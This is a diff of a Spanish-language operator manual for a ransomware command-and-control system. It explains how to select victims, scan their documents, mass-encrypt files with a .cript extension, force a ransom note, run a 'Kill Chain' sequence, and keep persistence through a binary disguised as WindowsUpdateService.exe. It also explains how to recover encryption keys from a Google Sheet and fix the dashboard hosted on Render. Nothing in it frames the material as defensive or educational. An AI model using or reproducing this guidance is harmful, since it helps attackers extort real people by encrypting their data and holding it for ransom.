@@ -1,161 +1,62 @@
-# 📖 Manual de Operaciones - Terminal Remota C2
+# 📖 Manual de Operaciones: C2 Dashboard & Recovery
 
-## 🔧 Comandos desde la Consola Interactiva
-
-### 1. Escaneo de Archivos
-El escaneo busca archivos con extensiones específicas en el directorio actual.
-
-**Desde el Dashboard:** Usa el botón "Escanear Archivos" en la sección de Archivos.
-
-**Desde la Terminal Remota (Shell):**
-```cmd
-c2:scan
-```
-
-**Alternativa con CMD:**
-```cmd
-dir /s *.doc *.docx *.pdf *.txt *.xls *.xlsx *.jpg *.png
-```
+Este manual describe el uso diario del sistema C2 y los procedimientos de emergencia para recuperación de claves.
 
 ---
 
-### 2. Cifrado de Archivos
-Cifra los primeros 100 archivos encontrados (límite configurable).
+## 🆘 Procedimiento de Recuperación de Claves (Cloud Fallback)
 
-**Desde el Dashboard:** Usa el botón "Cifrar Archivos" en la sección de Archivos.
+**Escenario Crítico**: El servidor de Render se ha reiniciado y el Dashboard muestra claves vacías o "N/A" para clientes que ya estaban cifrados.
 
-**Desde la Terminal Remota (Shell):**
-```cmd
-c2:encrypt        # Cifra hasta 100 archivos
-c2:encrypt 50     # Cifra hasta 50 archivos
-c2:encrypt 200    # Cifra hasta 200 archivos
-```
-
-Los archivos cifrados tendrán la extensión `.cript` añadida.
+### Pasos de Recuperación:
+1.  Accede a tu **Google Sheet** (Base de Datos).
+2.  Busca la pestaña **"Keys"** o **"Clients"**.
+3.  Localiza la fila correspondiente al **ID del Cliente** o **Hostname** afectado.
+4.  Copia el valor de la columna **AES_KEY** (string hexadecimal de 64 caracteres).
+5.  **Uso Manual**:
+    *   Puedes usar esta clave para descifrar manualmente archivos `.cript` usando herramientas como OpenSSL o un script de Node.js local si el comando de descifrado remoto falla.
 
 ---
 
-### 3. Mostrar Nota de Rescate
-Muestra la ventana de rescate en la víctima.
+## 🎛️ Operaciones del Dashboard
 
-**Desde el Dashboard:** Usa el botón "Mostrar Nota" en la sección de Archivos.
+### 1. Panel de Control (Home)
+*   **Selector de Cliente**: Permite elegir una víctima específica para enviar comandos dirigidos.
+*   **Estado WS**: "Online" indica conexión activa con el servidor Socket.IO.
+*   **Ejecución en Cadena**: Botones numerados 1-4 para ejecutar el "Kill Chain" completo en orden.
 
-**Desde la Terminal Remota (Shell):**
-```cmd
-c2:ransom
-```
-
-**Requisito:** El archivo `nota_rescate.exe` debe estar en:
-```
-C:\Users\[Usuario]\AppData\Roaming\WindowsUpdate\nota_rescate.exe
-```
-
----
-
-### 4. Descifrado de Archivos
-Restaura los archivos cifrados a su estado original.
-
-**Desde el Dashboard:** Usa el botón "Descifrar Archivos" en la sección de Archivos.
-
-Busca todos los archivos `.cript` y los restaura.
+### 2. Comandos Remotos (Consola)
+Comandos nativos que se pueden enviar desde la caja de texto:
+*   `dir` / `ls`: Listar archivos.
+*   `whoami`: Ver usuario actual.
+*   `c2:scan`: Escaneo rápido de documentos valiosos.
+*   `c2:encrypt`: Lanzar cifrado masivo.
 
 ---
 
-## 📦 Comandos ZIP (Compresión)
+## ⚡ Comandos Especiales ("Magic Words")
 
-### Comprimir archivos en ZIP
-Usando PowerShell desde la Terminal Remota:
+El cliente reconoce prefijos especiales para tareas automatizadas:
 
-**Comprimir un archivo:**
-```cmd
-powershell Compress-Archive -Path "C:\ruta\archivo.txt" -DestinationPath "C:\ruta\archivo.zip"
-```
-
-**Comprimir varios archivos:**
-```cmd
-powershell Compress-Archive -Path "C:\ruta\archivo1.txt","C:\ruta\archivo2.txt" -DestinationPath "C:\ruta\archivos.zip"
-```
-
-**Comprimir una carpeta completa:**
-```cmd
-powershell Compress-Archive -Path "C:\ruta\carpeta\*" -DestinationPath "C:\ruta\carpeta.zip"
-```
-
-**Agregar archivos a un ZIP existente:**
-```cmd
-powershell Compress-Archive -Path "C:\ruta\nuevo.txt" -Update -DestinationPath "C:\ruta\archivo.zip"
-```
+| Comando | Acción |
+|---------|--------|
+| `c2:scan` | Escanea recursivamente buscando .pdf, .docx, .xlsx, .jpg |
+| `c2:encrypt [n]` | Cifra `n` archivos (defecto: 100). Ej: `c2:encrypt 500` |
+| `c2:ransom` | Fuerza la apertura de la nota de rescate (GUI) |
+| `c2:kill` | **⚠️ Destructivo**: Detiene la persistencia y elimina el malware (Self-destruct) |
 
 ---
 
-### Descomprimir archivos ZIP
+## 🐛 Solución de Problemas (Troubleshooting)
 
-**Extraer a una carpeta específica:**
-```cmd
-powershell Expand-Archive -Path "C:\ruta\archivo.zip" -DestinationPath "C:\ruta\destino"
-```
+### Dashboard "Dormido"
+Si al entrar ves "WS: Offline":
+1.  Espera 30-60 segundos. Render pone en suspensión los servicios gratuitos tras inactividad.
+2.  Recarga la página (F5).
 
-**Extraer sobrescribiendo archivos existentes:**
-```cmd
-powershell Expand-Archive -Path "C:\ruta\archivo.zip" -DestinationPath "C:\ruta\destino" -Force
-```
-
----
-
-## 🔍 Comandos Útiles de Navegación
-
-| Comando | Descripción |
-|---------|-------------|
-| `dir` | Lista archivos del directorio actual |
-| `cd ..` | Subir un nivel |
-| `cd C:\ruta` | Ir a un directorio específico |
-| `cd %USERPROFILE%\Desktop` | Ir al escritorio del usuario |
-| `tree` | Mostrar árbol de directorios |
-| `type archivo.txt` | Ver contenido de un archivo |
-| `del archivo.txt` | Eliminar un archivo |
-| `mkdir carpeta` | Crear una carpeta |
-| `rmdir /s /q carpeta` | Eliminar carpeta y contenido |
-| `copy origen destino` | Copiar archivo |
-| `move origen destino` | Mover archivo |
-| `rename viejo nuevo` | Renombrar archivo |
+### Cliente conectado pero no responde
+1.  El cliente puede estar tras un Firewall estricto que bloquea WebSockets.
+2.  Intenta enviar un comando simple como `ping 127.0.0.1` para verificar vida.
+3.  Si no responde, espera al próximo "Heartbeat" (reconexión automática cada 5-10 min).
 
 ---
-
-## 💻 Comandos de Información del Sistema
-
-| Comando | Descripción |
-|---------|-------------|
-| `ipconfig` | Ver configuración de red |
-| `systeminfo` | Información del sistema |
-| `whoami` | Usuario actual |
-| `hostname` | Nombre del equipo |
-| `tasklist` | Procesos en ejecución |
-| `netstat -an` | Conexiones de red |
-
----
-
-## ⚠️ Notas Importantes
-
-1. **Directorio de cifrado:** El cifrado ahora opera en el directorio donde se ejecute el cliente (`process.cwd()`).
-
-2. **Persistencia:** El cliente se copia automáticamente a:
-   `%APPDATA%\WindowsUpdate\WindowsUpdateService.exe`
-
-3. **Timeout:** Los comandos tienen un límite de 2 minutos antes de marcar timeout.
-
-4. **Extensiones objetivo:**
-   - Documentos: doc, docx, pdf, txt, xls, xlsx, pptx
-   - Imágenes: jpg, png
-   - Media: mp3, mp4
-
-
-
-Comandos C2 disponibles:
-
-Comando	Descripción
-c2:help	Ver todos los comandos disponibles
-c2:scan	Escanear archivos en el directorio actual
-c2:encrypt	Cifrar hasta 100 archivos
-c2:encrypt 50	Cifrar hasta 50 archivos
-c2:decrypt	Descifrar archivos .cript
-c2:ransom	Mostrar nota de rescate
